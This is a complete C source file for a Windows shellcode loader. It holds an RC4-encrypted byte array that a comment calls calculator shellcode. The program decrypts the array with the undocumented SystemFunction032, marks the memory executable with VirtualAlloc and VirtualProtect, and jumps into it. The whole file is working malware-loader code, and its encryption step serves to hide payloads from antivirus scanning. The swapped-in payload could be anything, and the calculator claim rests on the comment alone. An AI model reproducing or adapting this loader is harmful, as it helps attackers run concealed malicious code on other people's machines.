#include <stdio.h>
#include <windows.h>
#include <stdlib.h>

typedef VOID(WINAPI* fnShellcode)();

// Calculator shellcode encrypted with key "CreateThread"
const unsigned char encrypted[] = { 0x72, 0x41, 0xbd, 0x93, 0x30, 0x2c, 0xf0, 0x5d, 0x57, 0x37, 0x72, 0xa4, 0x10, 0x32, 0x68, 0x1b, 0x64, 0xc8, 0x1b, 0xb5, 0x72, 0xb7, 0xe0, 0x3b, 0x43, 0x22, 0x92, 0xf1, 0x8a, 0xd3, 0xd8, 0xb0, 0x17, 0xf5, 0xc3, 0x81, 0x21, 0x53, 0xd2, 0xc3, 0x8a, 0x4e, 0xbd, 0xef, 0x66, 0x4b, 0x5f, 0x8e, 0x96, 0x3c, 0xd2, 0x84, 0xfa, 0x61, 0x62, 0xa7, 0xfd, 0xb6, 0xbc, 0xed, 0x72, 0x57, 0x90, 0xb9, 0x5f, 0xc1, 0x7e, 0x77, 0x02, 0x11, 0xd2, 0x4a, 0x4d, 0xd6, 0xc8, 0x4a, 0x81, 0x97, 0x30, 0x01, 0xd3, 0xe0, 0x3c, 0x67, 0x31, 0xc3, 0xf7, 0xea, 0xae, 0xcf, 0x01, 0x90, 0x61, 0x16, 0x76, 0x1d, 0x98, 0xa5, 0xa5, 0x19, 0x2d, 0x23, 0x9f, 0x72, 0x1b, 0x0f, 0xe6, 0xdf, 0x82, 0xa8, 0x08, 0x33, 0x56, 0xed, 0x42, 0xe0, 0xff, 0xde, 0xa1, 0x59, 0xa0, 0x11, 0x76, 0x73, 0x05, 0xdf, 0x6f, 0x3d, 0x64, 0x50, 0x90, 0x59, 0x4c, 0x37, 0xef, 0x53, 0x5a, 0xc6, 0x25, 0x78, 0x44, 0x30, 0x3f, 0x4e, 0x26, 0x91, 0xba, 0xa5, 0x5d, 0x9e, 0xe9, 0x9f, 0x3f, 0x02, 0xa7, 0xcb, 0x59, 0x57, 0xe3, 0xd6, 0x2f, 0x20, 0x3d, 0xb2, 0x19, 0xd8, 0x1b, 0xb3, 0x5f, 0xeb, 0x4d, 0xe9, 0x97, 0xed, 0xf4, 0xa8, 0xd4, 0x3f, 0x7d, 0xa1, 0xc3, 0x46, 0x86, 0xc4, 0x9d, 0x0e, 0x76, 0x5d, 0x0c, 0x8a, 0x83, 0x92, 0x0f, 0x28, 0x57, 0x28, 0x69, 0xee, 0xba, 0x9e, 0x62, 0x2d, 0x68, 0x50, 0x92, 0x57, 0xc6, 0xd9, 0x12, 0x9c, 0x0c, 0xe5, 0x31, 0x80, 0x1e, 0x33, 0xe3, 0xe5, 0x52, 0x23, 0x0a, 0x96, 0xdc, 0xca, 0xe7, 0xc6, 0xc6, 0x60, 0x32, 0x2b, 0xcd, 0xb3, 0xaa, 0xed, 0xeb, 0xf2, 0x25, 0x7c, 0x6a, 0xa9, 0x0c, 0x05, 0x14, 0x12, 0xbe, 0xca, 0xc6, 0x99, 0x2c, 0x3b, 0x5c, 0xc1, 0x03, 0x54, 0x7e, 0x56, 0x62, 0xdd, 0x39, 0xac, 0x23, 0xe1, 0x35, 0xfd, 0x0e, 0xba, 0x1c, 0x34, 0x7a, 0x81, 0x39, 0xef };

typedef struct {
	DWORD Length;
	DWORD MaximumLength;
	PVOID Buffer;
} USTRING;
typedef NTSTATUS(NTAPI* fpSystemFunction032)(USTRING* data, const USTRING* key);

void rc4Enc_undoc(const char* key, const SIZE_T keyLen, char* src, const SIZE_T srcLen)
{
	// Load NTDLL
	const char aAdvpi32[] = "advapi32.dll";
	HMODULE hAdvpi32 = GetModuleHandleA(aAdvpi32);
	if (hAdvpi32 == NULL) hAdvpi32 = LoadLibraryA(aAdvpi32);
	if (hAdvpi32 == NULL) exit(GetLastError());

	// Load SystemFunction032
	PVOID pSystemFunction032 = GetProcAddress(hAdvpi32, "SystemFunction032");
	fpSystemFunction032 SystemFunction032 = (fpSystemFunction032)pSystemFunction032;
	if (SystemFunction032 == NULL) exit(GetLastError());

	// Initialise arguments
	USTRING* uData = (USTRING*)malloc(sizeof(USTRING));
	USTRING* uKey = (USTRING*)malloc(sizeof(USTRING));
	uData->Length = uData->MaximumLength = srcLen;
	uData->Buffer = (PVOID)src;
	uKey->Length = uKey->MaximumLength = keyLen;
	uKey->Buffer = (PVOID)key;

	// Run function
	NTSTATUS result = SystemFunction032(uData, uKey);
	if (result < 0) exit(result);

	// Update src
	memcpy(src, uData->Buffer, srcLen);
}

int main()
{
	SIZE_T shellcodeLen = sizeof(encrypted) * sizeof(char);
	PVOID shellcode = VirtualAlloc(NULL, shellcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (shellcode == NULL) {
		printf("VirtualAlloc failed with error: %d\n", GetLastError());
		return 1;
	}
	DWORD oldProt = NULL;

	// Copy code in
	memcpy(shellcode, encrypted, shellcodeLen);
	rc4Enc_undoc("CreateThread", strlen("CreateThread"), (char*)shellcode, shellcodeLen);

	if (VirtualProtect(
		shellcode, shellcodeLen, PAGE_EXECUTE_READWRITE, &oldProt
	) == NULL) {
		printf("VirtualProtect failed with error: %d\n", GetLastError());
		return 1;
	}

	fnShellcode pCalc = (fnShellcode)shellcode;

	pCalc();
	/*if (CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)shellcode, NULL, NULL, NULL) == NULL) {
		printf("CreateThread failed with error: %d\n", GetLastError());
		return 1;
	}*/
	return 1;
}
